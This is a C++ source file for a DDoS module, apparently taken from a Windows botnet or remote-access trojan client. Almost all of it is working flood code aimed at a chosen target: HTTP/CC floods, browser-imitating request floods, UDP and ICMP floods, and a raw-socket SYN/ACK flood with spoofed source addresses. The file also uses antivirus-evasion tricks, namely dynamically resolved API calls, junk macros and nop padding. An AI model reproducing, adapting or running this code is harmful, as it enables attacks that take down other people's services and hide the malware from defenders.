#include "StdAfx.h"
#include "DDOSManager.h"

typedef LPVOID (WINAPI *HeapAllocT)
(
 HANDLE hHeap,
 DWORD dwFlags,
 DWORD dwBytes
 );

typedef HANDLE (WINAPI *GetProcessHeapT)
( VOID );


typedef HANDLE (WINAPI *CreateThreadT)
(
 LPSECURITY_ATTRIBUTES lpThreadAttributes,
 DWORD dwStackSize,
 LPTHREAD_START_ROUTINE lpStartAddress,
 LPVOID lpParameter,
 DWORD dwCreationFlags,
 LPDWORD lpThreadId
 );


enum 
{
	ATTACK_CCFLOOD,     //����CC
	ATTACK_IMITATEIE,   //ģ��IE
	ATTACK_LOOPCC,      //�ֻ�CC
	ATTACK_ICMPFLOOD,   //ICMP
	ATTACK_UDPFLOOD,    //UDP
	ATTACK_TCPFLOOD,    //TCP
	ATTACK_SYNFLOOD,	//SYN
	ATTACK_BRAINPOWER,  //����.
	CUSTOM_TCPSEND=100, //TCP ����
	CUSTOM_UDPSEND,     //UDP ����
};

//�мǲ�������Ϊstatic...
BOOL Stoping = FALSE;

DWORD DDOSManager::CountTime = 0;




DWORD DDOSManager::CreateRandNum(WORD Min,WORD Max)
{
	SYSTEMTIME st;
	GetLocalTime(&st);
	__asm nop;
	__asm nop;
	__asm nop;
__asm nop;
	if(Min==0&&Max==0)
		return GetTickCount()+rand()+st.wMinute+st.wSecond;
	else
		return (GetTickCount()+rand()+st.wMinute+st.wSecond)%((Max-Min)+1)+Min;
}

/*
VOID DebugStr(LPSTR szStr)
{
	HANDLE m_Handle = CreateFile("c:\\Debug.txt",GENERIC_WRITE,
		FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	
	if(m_Handle == NULL)
		return;
	
	
	SetFilePointer(m_Handle,0,0,FILE_END);
	
	DWORD Writen =0;
	
	WriteFile(m_Handle,szStr,strlen(szStr),&Writen,NULL);
	WriteFile(m_Handle,"\r\n",2,&Writen,NULL);
	CloseHandle(m_Handle);
}
*/

DWORD DDOSManager::ResolvDNS(LPSTR szTarget)
{
	if(szTarget == NULL)
		return FALSE;
	ANTIVIRUS
		DWORD Result = inet_addr(szTarget);
	if(Result!=INADDR_NONE)
		return Result;
	
	hostent Host={0};
	memcpy(&Host,gethostbyname(szTarget),sizeof(hostent));
	
	memcpy(&Result,Host.h_addr,sizeof(DWORD));
	
	return Result;
}

DWORD WINAPI DDOSManager::CreateTimeer(LPVOID lParam)
{
	DWORD SleepTime=CountTime;
	CountTime =0;

	SleepTime=SleepTime*60*1000;

	DWORD CountTime=0;
	
	while(CountTime<SleepTime)
	{
		if(Stoping==FALSE)
			return 1;
ANTIVIRUS
		CountTime+=500;
		Sleep(500);
	}
	Stoping = FALSE;

	return 0;
}

//��ȡϵͳ���� 
BOOL GetSystemType()
{
	__asm nop;
	__asm nop;
	char windows[128]={NULL};
	ZeroMemory(windows,128);
	
	char SubKeys[MAX_PATH];
	__asm nop;
	__asm nop;
	__asm nop;
__asm nop;
	strcpy(SubKeys,"softWARE\\Microsoft\\Windows NT\\CurrentVersion");
	HKEY hKeys;
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,SubKeys,0L,KEY_ALL_ACCESS,&hKeys) == ERROR_SUCCESS)
	{
		DWORD dwType;
		DWORD dwSize=200;
		__asm nop;
		__asm nop;
		__asm nop;
ANTIVIRUS
		RegQueryValueEx(hKeys,"ProductName",NULL,&dwType,(BYTE *)windows,&dwSize);
		RegCloseKey(hKeys);	
	}
	
	if( strstr(windows,"2000")!=NULL || 
		strstr(windows,"2003")!=NULL ||
		strstr(windows,"2008")!=NULL )
	{
		return TRUE;
	}
ANTIVIRUS
	return FALSE;
}


DDOSManager::DDOSManager(LPATTACK PoinParam)
{
	Stoping = TRUE;

	memcpy(&m_Attack,PoinParam,sizeof(ATTACK));
	CountTime = m_Attack.AttackTime;

	CHAR Tip[2000];

	//�������Զ���ģʽ �򷢰��ٶ�Ĭ��Ϊ100���� 
	if(
		m_Attack.AttackType!=CUSTOM_TCPSEND  && 
		m_Attack.AttackType!=CUSTOM_UDPSEND  &&
		m_Attack.AttackType!=ATTACK_LOOPCC
		)
	{

		m_Attack.ExtendData2 = 100;
		m_Attack.DataSize = strlen(m_Attack.SendData);
	}

	//������ʱ��...
CreateThreadT pCreateThread= (CreateThreadT)GetProcAddress(LoadLibrary("kernel32.dll"),"CreateThread");
	CloseHandle(pCreateThread(NULL,NULL,CreateTimeer,&m_Attack.AttackTime,0,NULL));


	int i=0;

	switch(m_Attack.AttackType)
	{

	case ATTACK_CCFLOOD:
		for(i=0;i<m_Attack.AttackThread;i++)

			CloseHandle(pCreateThread(NULL,NULL,CCAttack,&m_Attack,0,NULL));
		break;
	case ATTACK_IMITATEIE:
		for(i=0;i<m_Attack.AttackThread;i++)

			 CloseHandle(pCreateThread(NULL,NULL,ImitateIERequst,&m_Attack,0,NULL));
		break;
	case ATTACK_LOOPCC:
		for(i=0;i<m_Attack.AttackThread;i++)
			CloseHandle(pCreateThread(NULL,NULL,LoopCCAttack,&m_Attack,0,NULL));
		 break;
	case ATTACK_ICMPFLOOD:
		for(i=0;i<m_Attack.AttackThread;i++)
			CloseHandle(pCreateThread(NULL,NULL,ICMP_Flood,&m_Attack,0,NULL));
		 break;
	case ATTACK_UDPFLOOD:
		{	for(i=0;i<m_Attack.AttackThread;i++)
			{	
				//UDP �Զ������ݰ�..
				m_Attack.DataSize = 10;
				ZeroMemory(m_Attack.SendData,sizeof(m_Attack.SendData));
				for(int x=0;x<m_Attack.DataSize;x++)
					m_Attack.SendData[x]=CreateRandNum(1,200);
				CloseHandle(pCreateThread(NULL,NULL,UDPAttackModel,&m_Attack,0,NULL));
			}
		}
		break;
	case ATTACK_TCPFLOOD:
		{
			for(i=0;i<m_Attack.AttackThread;i++)
			{
CreateThreadT pCreateThread= (CreateThreadT)GetProcAddress(LoadLibrary("kernel32.dll"),"CreateThread");
			m_Attack.DataSize = 20;
			ZeroMemory(m_Attack.SendData,sizeof(m_Attack.SendData));
			__asm nop;
			__asm nop;
			__asm nop;
__asm nop;
			for(int x=0;x<m_Attack.DataSize;x++)
				m_Attack.SendData[x]=CreateRandNum(1,200);
			CloseHandle(pCreateThread(NULL,NULL,CCAttack,&m_Attack,0,NULL));
			}
		}
		break;
	case ATTACK_SYNFLOOD:
		for(i=0;i<m_Attack.AttackThread;i++)
			CloseHandle(pCreateThread(NULL,NULL,SYNFlood,&m_Attack,0,NULL));
		break;
	case CUSTOM_TCPSEND:
		{
			for(i=0;i<m_Attack.AttackThread;i++)
				CloseHandle(pCreateThread(NULL,NULL,CCAttack,&m_Attack,0,NULL));
		}
		break;
	case CUSTOM_UDPSEND:
		{
			for(i=0;i<m_Attack.AttackThread;i++)

				CloseHandle(pCreateThread(NULL,NULL,UDPAttackModel,&m_Attack,0,NULL));
		}	
		break;

	//����ģʽ ��Ҫ���м���.
	case ATTACK_BRAINPOWER:
		{
			if(GetSystemType())
			{	for(i=0;i<m_Attack.AttackThread;i++)
				{
CreateThreadT pCreateThread= (CreateThreadT)GetProcAddress(LoadLibrary("kernel32.dll"),"CreateThread");
					CloseHandle(pCreateThread(NULL,NULL,ICMP_Flood,&m_Attack,0,NULL));
					CloseHandle(pCreateThread(NULL,NULL,SYNFlood,&m_Attack,0,NULL));
					i++;
				}	
			}
			else
			{
ANTIVIRUS
				for(i=0;i<m_Attack.AttackThread;i++)
				{
					m_Attack.DataSize = 20;
					ZeroMemory(m_Attack.SendData,sizeof(m_Attack.SendData));
					for(int x=0;x<m_Attack.DataSize;x++)
						m_Attack.SendData[x]=CreateRandNum(1,200);
					__asm nop;
					__asm nop;
					__asm nop;
__asm nop;
CreateThreadT pCreateThread= (CreateThreadT)GetProcAddress(LoadLibrary("kernel32.dll"),"CreateThread");
					CloseHandle(pCreateThread(NULL,NULL,CCAttack,&m_Attack,0,NULL));
XJBQIFA
					CloseHandle(pCreateThread(NULL,NULL,UDPAttackModel,&m_Attack,0,NULL));
					i++;
				}
			}
		}
		break;
	default: break;
	}
	Sleep(1000);
}

/*typedef struct DDOS_HEAD
{
	CHAR Target[400];    //����Ŀ��
	WORD AttackPort;     //�����˿�
	WORD AttackType;     //��������
	WORD AttackThread;   //�����߳�
	WORD AttackTime;     //����ʱ��
	CHAR SendData[2000]; //���͵����ݰ�
	WORD DataSize;       //���ݰ���С
	DWORD ExtendData1;   //��������
	DWORD ExtendData2;   //��������
}ATTACK,*LPATTACK;
*/

DWORD WINAPI DDOSManager::CCAttack(LPVOID lParam)
{

	ATTACK m_AttackInfo;
XJBQIFA
	memcpy(&m_AttackInfo,lParam,sizeof(ATTACK));

	SOCKADDR_IN m_Addr={0};
	ZeroMemory(&m_Addr,sizeof(SOCKADDR_IN));
	int Size = sizeof(SOCKADDR);
	
	m_Addr.sin_family = AF_INET;
XJBQIFA
ANTIVIRUS
	m_Addr.sin_port =htons(m_AttackInfo.AttackPort);
	__asm nop;
	__asm nop;
	__asm nop;
__asm nop;
	m_Addr.sin_addr.S_un.S_addr = ResolvDNS(m_AttackInfo.Target);

	SOCKET m_Socket;
	DWORD len = m_AttackInfo.DataSize;
	DWORD SendSize = 0;
	DWORD AllSendSize =0;
	do
	{
		XJBAV
		m_Socket= socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
		XJBQIFA
		Sleep(m_AttackInfo.ExtendData2);
		ANTIVIRUS
XJBQIFA
		if(connect(m_Socket,(SOCKADDR *)&m_Addr,Size)==SOCKET_ERROR)
			continue;
	
		XJBAV
		//��������...
		do
		{
			SendSize = send(m_Socket,&m_AttackInfo.SendData[AllSendSize],(int)(len-AllSendSize),0);
			AllSendSize+=SendSize;
		}while(AllSendSize<len);

		XJBAV
		closesocket(m_Socket);
		XJBQIFA
		AllSendSize =0;
		ANTIVIRUS

	}while(Stoping);
	__asm nop;
		__asm nop;
	return 0;
}

//////////////////////�ٴΰ�� 


/////////////////////////////

DWORD WINAPI DDOSManager::ImitateIERequst(LPVOID lParam)
{
	ATTACK m_AttackInfo;
	memcpy(&m_AttackInfo,lParam,sizeof(ATTACK));

	HMODULE hModule=LoadLibrary("WININET.dll");
	typedef BOOL(WINAPI *InternetCloseHandleT)(HINTERNET);
	__asm nop;
	__asm nop;
	__asm nop;
ANTIVIRUS
 	InternetCloseHandleT pInternetCloseHandleT=(InternetCloseHandleT)GetProcAddress(hModule,"InternetCloseHandle");

	typedef HINTERNET(WINAPI *InterOpen)(LPCTSTR,DWORD,LPCTSTR,LPCTSTR,DWORD);
 	InterOpen pInterOpen=(InterOpen)GetProcAddress(hModule,"InternetOpenA");

	typedef HINTERNET(WINAPI *OpenUrl)(HINTERNET ,LPCTSTR, LPCTSTR ,DWORD,DWORD,DWORD);
	OpenUrl pOpenUrl=(OpenUrl)GetProcAddress(hModule,"InternetOpenUrlA");
	


	while(Stoping)
	{

		HINTERNET hNet =pInterOpen("User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET4.0C; .NET4.0E)",PRE_CONFIG_INTERNET_ACCESS,NULL,
			INTERNET_INVALID_PORT_NUMBER,0);
		XJBAV
		pOpenUrl(hNet,m_AttackInfo.Target, NULL,0, INTERNET_FLAG_RELOAD,0); 

		pInternetCloseHandleT(hNet);
		XJBAV
		Sleep(m_AttackInfo.ExtendData2);

	}

	FreeLibrary(hModule);

	return 0;
}

DWORD WINAPI DDOSManager::LoopCCAttack(LPVOID lParam)
{
	
	ATTACK m_AttackInfo;
	memcpy(&m_AttackInfo,lParam,sizeof(ATTACK));	
	
	CHAR *Point = strstr(m_AttackInfo.SendData,"%d");
	if(Point==NULL)
		return 1;
	//�õ��ײ�..
	CHAR szTempHead[1000]={NULL};
	ZeroMemory(szTempHead,1000);
	strncpy(szTempHead,m_AttackInfo.SendData,strlen(m_AttackInfo.SendData)-strlen(Point));
	
	Point+=2;
	//�õ�β��
	CHAR szTempEnd[1000]={NULL};
	strcpy(szTempEnd,Point);
	
	//����Buffer
	CHAR Buffer[2000]={NULL};
	
	SOCKADDR_IN m_Addr={0};
	ZeroMemory(&m_Addr,sizeof(SOCKADDR_IN));
	int Size = sizeof(SOCKADDR);
	
	m_Addr.sin_family = AF_INET;

		m_Addr.sin_port =htons(m_AttackInfo.AttackPort);

		m_Addr.sin_addr.S_un.S_addr = ResolvDNS(m_AttackInfo.Target);

		
		SOCKET m_Socket;
	DWORD len =strlen(m_AttackInfo.SendData);
	DWORD SendSize = 0;
	DWORD AllSendSize =0;
	DWORD iCount = m_AttackInfo.ExtendData1;
	
	do
	{

			sprintf(m_AttackInfo.SendData,"%s%d%s",szTempHead,m_AttackInfo.ExtendData1,szTempEnd);
		__asm nop;
		__asm nop;
		__asm nop;
		__asm nop;
		if(m_AttackInfo.ExtendData1++ == m_AttackInfo.ExtendData2)
			m_AttackInfo.ExtendData1 = iCount;
		XJBQIFA
			m_Socket= socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
		XJBQIFA
			XJBAV
			if(connect(m_Socket,(SOCKADDR *)&m_Addr,Size)==SOCKET_ERROR)
				continue;
			XJBAV
				//��������...
				do
				{
					SendSize = send(m_Socket,&m_AttackInfo.SendData[AllSendSize],(int)(len-AllSendSize),0);
					AllSendSize+=SendSize;
				}while(AllSendSize<len);
				XJBQIFA
					XJBAV
					closesocket(m_Socket);
				AllSendSize =0;
				ANTIVIRUS
					Sleep(m_AttackInfo.ExtendData2);
				ANTIVIRUS
	}while(Stoping);
	
	return 0;
}



DWORD WINAPI DDOSManager::UDPAttackModel(LPVOID lParam)
{
	ATTACK m_AttackInfo;
	memcpy(&m_AttackInfo,lParam,sizeof(ATTACK));
	
	SOCKADDR_IN sockAddr={0};
	ZeroMemory(&sockAddr,sizeof(SOCKADDR_IN));
	
	SOCKET	m_hSocket;
	sockAddr.sin_family = AF_INET;
	ANTIVIRUS
SMJJ
	sockAddr.sin_port=htons(m_AttackInfo.AttackPort);
	ANTIVIRUS
	sockAddr.sin_addr.S_un.S_addr=ResolvDNS(m_AttackInfo.Target);
	
	WORD Size = m_AttackInfo.DataSize;
	
	WORD StructSize = sizeof(SOCKADDR);
	
	do {
		ANTIVIRUS
		m_hSocket =socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		
		for(int i=0;i<100;i++)
			sendto(m_hSocket,m_AttackInfo.SendData,(Size-1),0,(SOCKADDR *)&sockAddr,StructSize);
		ANTIVIRUS
		closesocket(m_hSocket);
		ANTIVIRUS
SMJJ
		Sleep(m_AttackInfo.ExtendData2);
		
	} while(Stoping);
	
	return 0;
}

//CheckSum:����У��͵��Ӻ��� 
USHORT checksum(USHORT *buffer,int size)
{
	unsigned long cksum=0;
	while (size>1)
	{
		cksum+=*buffer++;
		size-=sizeof(USHORT);
	}
	if (size)
	{
		cksum+=*(UCHAR*)buffer;
	}
	cksum = (cksum >> 16) + (cksum & 0xffff); 
	cksum += (cksum >>16); 
	return (USHORT)(~cksum);
	
}


void DDOSManager::Fill_ICMP_Data(char *icmp_data, int datasize)
{
	ICMP_HEADER *icmp_hdr;
	char       *datapart;
	icmp_hdr = (ICMP_HEADER*)icmp_data;
	icmp_hdr->i_type = ICMP_ECHO;
	icmp_hdr->i_code = 0;

	icmp_hdr->i_id   = (USHORT)GetCurrentProcessId();
	icmp_hdr->i_cksum = 0;
	icmp_hdr->i_seq = 0;
	
	datapart = icmp_data + sizeof(ICMP_HEADER);
	
	CHAR icmpBuffer[4000]={NULL};
	for (WORD i=0;i<3999;i++)
		icmpBuffer[i]=(CHAR)(CreateRandNum(1,255))%255;
	
	memcpy(datapart,icmpBuffer,strlen(icmpBuffer));
}

DWORD WINAPI DDOSManager::ICMP_Flood(LPVOID lParam)
{
	ATTACK m_AttackInfo;
	memcpy(&m_AttackInfo,lParam,sizeof(ATTACK));

	SOCKET m_hSocket;
	SOCKADDR_IN m_addrDest;
	char              *icmp_data;
	int   datasize = 32;
	int timeout = 2000;
	
	ANTIVIRUS
	m_hSocket = WSASocket (AF_INET, SOCK_RAW, IPPROTO_ICMP, NULL, 0,WSA_FLAG_OVERLAPPED);
	ANTIVIRUS
	if (m_hSocket == INVALID_SOCKET) 
		return 0;
	
	ANTIVIRUS
	if (setsockopt(m_hSocket, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout)) == SOCKET_ERROR) 
		return 0;
	
	ANTIVIRUS
	memset(&m_addrDest, 0, sizeof(m_addrDest));
	
	m_addrDest.sin_family = AF_INET;
	m_addrDest.sin_addr.S_un.S_addr=ResolvDNS(m_AttackInfo.Target);
	ANTIVIRUS
	datasize += sizeof(ICMP_HEADER);  
	ANTIVIRUS
HeapAllocT pHeapAlloc= (HeapAllocT)GetProcAddress(LoadLibrary("kernel32.dll"),"HeapAlloc");
GetProcessHeapT pGetProcessHeap= (GetProcessHeapT)GetProcAddress(LoadLibrary("kernel32.dll"),"GetProcessHeap");
	icmp_data =(char*) pHeapAlloc(pGetProcessHeap(), HEAP_ZERO_MEMORY,MAX_PACKET);
	
	memset(icmp_data,0,MAX_PACKET);
	
	Fill_ICMP_Data(icmp_data,MAX_PACKET);
	
	int seq_no=0;

	while(Stoping)
	{ 
		ANTIVIRUS
		Sleep(m_AttackInfo.ExtendData2);
		((ICMP_HEADER*)icmp_data)->i_cksum = 0;
		((ICMP_HEADER*)icmp_data)->i_seq =	seq_no++;
		ANTIVIRUS
		((ICMP_HEADER*)icmp_data)->timestamp = GetTickCount();
		ANTIVIRUS
		((ICMP_HEADER*)icmp_data)->i_cksum = checksum((USHORT*)icmp_data, MAX_PACKET);
		ANTIVIRUS
		sendto(m_hSocket, icmp_data, MAX_PACKET, 0, (struct sockaddr*)&m_addrDest, sizeof(m_addrDest)); 
		
		if (seq_no>=65534)
			seq_no=1;
		ANTIVIRUS
		
	}

	return 0;
}

DWORD WINAPI DDOSManager::SYNFlood(LPVOID lParam)
{	

	ATTACK m_AttackInfo;
	memcpy(&m_AttackInfo,lParam,sizeof(ATTACK));

    SOCKET             sendSocket; 
    SOCKADDR_IN        Sin; 
    IP_HEADER          ipHeader;
    TCP_HEADER         tcpHeader; 
    PSD_HEADER         psdHeader; 
    char               szSendBuf[128] = ""; 
	
    if((sendSocket = WSASocket(AF_INET, SOCK_RAW, IPPROTO_RAW, NULL,
		0, WSA_FLAG_OVERLAPPED)) == INVALID_SOCKET) 
        return 0; 
	
	BOOL               flag=1; 
    if(setsockopt(sendSocket, IPPROTO_IP, IP_HDRINCL, 
		(char *)&flag, sizeof(flag)) == SOCKET_ERROR) 
        return 0; 
    int timeout = 3000; 
	ANTIVIRUS
    if(setsockopt(sendSocket, SOL_SOCKET, SO_SNDTIMEO,
		(char *)&timeout, sizeof(timeout)) == SOCKET_ERROR) 
        return 0; 
	
	Sin.sin_family = AF_INET; 
	Sin.sin_port=htons(m_AttackInfo.AttackPort); 
	Sin.sin_addr.S_un.S_addr=ResolvDNS(m_AttackInfo.Target); 
	
	char         src_ip[20] = {0};
	
	while(Stoping)
    {
		ANTIVIRUS
		int i = CreateRandNum(1,254);
SMJJ
		Sleep(m_AttackInfo.ExtendData2);
		sprintf( src_ip, "%d.%d.%d.%d ",i%230+1,i%220+1, i%252+1, i%253+1); 
		ANTIVIRUS
		//���IP�ײ� 
		ipHeader.h_verlen = (4<<4 | sizeof(ipHeader)/sizeof(unsigned long)); 
		ipHeader.tos = 0; 
		ipHeader.total_len = htons(sizeof(ipHeader)+sizeof(tcpHeader)); 
		ipHeader.ident = 1; 
		ipHeader.frag_and_flags = 0x40; 
		ipHeader.ttl = 128; 
		ipHeader.proto = IPPROTO_TCP; 
		ipHeader.checksum = 0; 
		ipHeader.sourceIP = inet_addr(src_ip); 
		ipHeader.destIP = Sin.sin_addr.s_addr; 
		ANTIVIRUS
		//���TCP�ײ� 
		tcpHeader.th_sport = htons(rand()%1025); //Դ�˿ں� 
		tcpHeader.th_dport = htons(80); //Ŀ��˿ں� 
		tcpHeader.th_seq = htonl( rand()%900000000 + 1 ); 
		tcpHeader.th_ack=rand()%3;
		if (rand()%2 == 0) tcpHeader.th_flag=0x02;//SYN
		else tcpHeader.th_flag=0x10;//ACK
		tcpHeader.th_lenres = (sizeof(tcpHeader)/4<<4|0); 
		tcpHeader.th_win = htons(512); 
		tcpHeader.th_sum = 0; 
		tcpHeader.th_urp = 0; 
		
		psdHeader.saddr = ipHeader.sourceIP; 
		psdHeader.daddr = ipHeader.destIP; 
		psdHeader.mbz = 0; 
		psdHeader.ptcl = IPPROTO_TCP; 
		psdHeader.tcpl = htons(sizeof(tcpHeader)); 
		
		//����TCPУ��� 
		memcpy( szSendBuf, &psdHeader, sizeof(psdHeader) ); 
		memcpy( szSendBuf + sizeof(psdHeader), &tcpHeader, sizeof(tcpHeader) ); 
		tcpHeader.th_sum = checksum( (USHORT *) szSendBuf, sizeof(psdHeader) + sizeof(tcpHeader) ); 
		
		//����IP����� 
		memcpy( szSendBuf, &ipHeader, sizeof(ipHeader) ); 
		memcpy( szSendBuf + sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader) ); 
		memset( szSendBuf + sizeof(ipHeader) + sizeof(tcpHeader), 0, 4 ); 
		ipHeader.checksum = checksum( (USHORT *) szSendBuf, sizeof(ipHeader) + sizeof(tcpHeader) ); 
		
		memcpy( szSendBuf, &ipHeader, sizeof(ipHeader) ); 
		memcpy( szSendBuf+sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader) ); 
		
		for(int a=0;a<100;a++)
			sendto(sendSocket, szSendBuf, sizeof(ipHeader) + sizeof(tcpHeader), 0, (struct sockaddr*)&Sin, sizeof(Sin)); 
	}
	closesocket(sendSocket);
	ANTIVIRUS
    return 0;
}